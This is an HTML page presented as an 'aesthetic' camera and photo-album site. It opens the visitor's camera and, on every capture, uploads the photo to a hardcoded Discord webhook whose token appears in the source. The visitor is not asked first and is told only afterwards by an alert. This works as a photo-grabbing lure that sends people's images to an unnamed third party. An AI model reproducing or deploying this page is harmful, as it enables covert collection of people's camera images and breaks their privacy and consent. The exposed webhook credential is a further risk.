<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Foto Aesthetic by Risqi123</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: linear-gradient(to bottom, #141e30, #243b55);
            color: white;
            font-family: Arial, sans-serif;
        }

        #video {
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            margin-bottom: 20px;
            max-width: 90%;
        }

        .button-group {
            display: flex;
            justify-content: center;
            gap: 15px;
        }

        button {
            padding: 15px;
            font-size: 24px;
            border: none;
            border-radius: 50%;
            background: #4CAF50;
            color: white;
            cursor: pointer;
            transition: background 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 60px;
            height: 60px;
        }

        button:hover {
            background: #45a049;
        }

        button:active {
            background: #3e8e41;
        }

        #album {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 20px;
            max-width: 90%;
            justify-content: center;
        }

        .thumbnail {
            width: 100px;
            height: 100px;
            background: #ffffff;
            border: 2px solid #4CAF50;
            border-radius: 5px;
            overflow: hidden;
            cursor: pointer;
            transition: transform 0.3s;
        }

        .thumbnail img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .thumbnail:hover {
            transform: scale(1.1);
        }

        #preview {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: none;
            z-index: 10;
            max-width: 90%;
            max-height: 90%;
        }

        #preview img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        #preview-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 5;
            display: none;
        }
    </style>
    <script>
        let currentFacingMode = 'user';

        function startCamera(facingMode) {
            const video = document.getElementById('video');
            if (video) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode } })
                    .then(stream => {
                        video.srcObject = stream;
                    })
                    .catch(error => {
                        alert('Kamera tidak bisa diakses: ' + error.message);
                    });
            }
        }

        function toggleCamera() {
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            startCamera(currentFacingMode);
        }

        function addToAlbum(blobUrl) {
            const album = document.getElementById('album');
            const thumbnail = document.createElement('div');
            thumbnail.className = 'thumbnail';
            thumbnail.innerHTML = `<img src="${blobUrl}" alt="Foto">`;
            thumbnail.onclick = () => showPreview(blobUrl);
            album.appendChild(thumbnail);
        }

        function showPreview(blobUrl) {
            const previewOverlay = document.getElementById('preview-overlay');
            const preview = document.getElementById('preview');
            const img = preview.querySelector('img');

            img.src = blobUrl;
            preview.style.display = 'block';
            previewOverlay.style.display = 'block';
        }

        function hidePreview() {
            const previewOverlay = document.getElementById('preview-overlay');
            const preview = document.getElementById('preview');

            preview.style.display = 'none';
            previewOverlay.style.display = 'none';
        }

        async function sendToDiscord(blob) {
            const webhookUrl = "https://discordapp.com/api/webhooks/1320606404985487391/mvaetfPZAjSEaEI9823-e7pqoXoe04V5NCcb8uQZyso983SnYWEbckHmOVUaPw6o2kFJ";
            const formData = new FormData();
            formData.append('file', blob, 'photo.png');

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });
                alert('Foto berhasil dikirim ke Discord!');
            } catch (error) {
                alert('Gagal mengirim ke Discord: ' + error.message);
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const captureButton = document.getElementById('capture');

            startCamera(currentFacingMode);

            captureButton.addEventListener('click', () => {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    const blobUrl = URL.createObjectURL(blob);
                    addToAlbum(blobUrl);
                    sendToDiscord(blob);
                });
            });

            document.getElementById('preview-overlay').onclick = hidePreview;
        });
    </script>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <div class="button-group">
        <button id="capture">
            <i class="fas fa-camera"></i>
        </button>
        <button onclick="toggleCamera()">
            <i class="fas fa-sync-alt"></i>
        </button>
    </div>
    <div id="album"></div>
    <div id="preview-overlay"></div>
    <div id="preview">
        <img src="" alt="Preview Foto">
    </div>
</body>
</html>
